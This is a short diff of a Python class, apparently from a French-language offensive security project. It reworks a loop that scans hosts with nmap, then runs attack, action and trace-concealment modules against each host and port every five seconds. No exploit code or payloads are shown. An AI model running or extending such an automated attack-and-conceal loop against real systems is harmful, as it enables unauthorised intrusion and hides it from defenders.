@@ -20,7 +20,7 @@ class Events():
         """
         signal(SIGTERM, endOfProgramm)
         self.isStart           = True
-        self.cibles            = {}
+        self.logGeneraux       = FIFO()
         self.logsAction        = FIFO()
         self.logsAttaque       = FIFO()
         self.logsDissimulation = FIFO()
@@ -32,19 +32,19 @@ class Events():
         self.isStart = True
         self.cibles  = {}
         while self.isStart:
-            self.cibles = nmap()
+            
+            for (host, port) in nmap(self):
+                for attaque in ATTAQUES:
+                    pkg = import_module(attaque)
+                    pkg.Attaque(self, host, port)
 
-            for attaque in ATTAQUES:
-                pkg = import_module(attaque)
-                pkg.Attaque(self)
+                for action in ACTIONS:
+                    pkg = import_module(action)
+                    pkg.Action(self, host, port)
 
-            for action in ACTIONS:
-                pkg = import_module(action)
-                pkg.Action(self)
-
-            for dissimulation in DISSIMULATIONS:
-                pkg = import_module(dissimulation)
-                pkg.Dissimulation(self)
+                for dissimulation in DISSIMULATIONS:
+                    pkg = import_module(dissimulation)
+                    pkg.Dissimulation(self, host, port)
             
             sleep(5)
 
